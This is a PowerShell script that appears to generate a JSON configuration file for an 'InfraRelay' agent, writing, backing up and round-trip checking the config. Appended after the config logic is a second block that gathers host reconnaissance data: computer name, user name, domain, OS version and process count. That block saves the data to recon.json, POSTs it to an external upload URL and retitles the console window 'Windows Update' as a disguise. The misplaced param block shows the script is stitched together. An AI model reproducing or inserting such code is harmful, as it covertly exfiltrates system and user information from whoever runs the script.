$ErrorActionPreference = 'Stop'

$OutputPath  = "C:\ProgramData\Contoso\InfraRelay\config.json"
$Environment = "Test"
$ApiPort     = 8080
$NodeCount   = 3
$Force       = $false

$DebugPreference = 'SilentlyContinue'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "InfraRelay",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://contoso.com/upload',
    [string]$ReportPath = "C:\ProgramData\recon.json"
)
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Collecting host telemetry"
    $ResultObject = [ordered]@{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        ProcessCount = (Get-Process).Count
    }
    $ResultObject | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
    Write-Verbose ("Telemetry written to " + $ReportPath)
    $Response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json"
    Write-Verbose ("Upload status: " + $Response)
}
catch {
    Write-Warning "Telemetry upload failed: $($_.Exception.Message)"
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
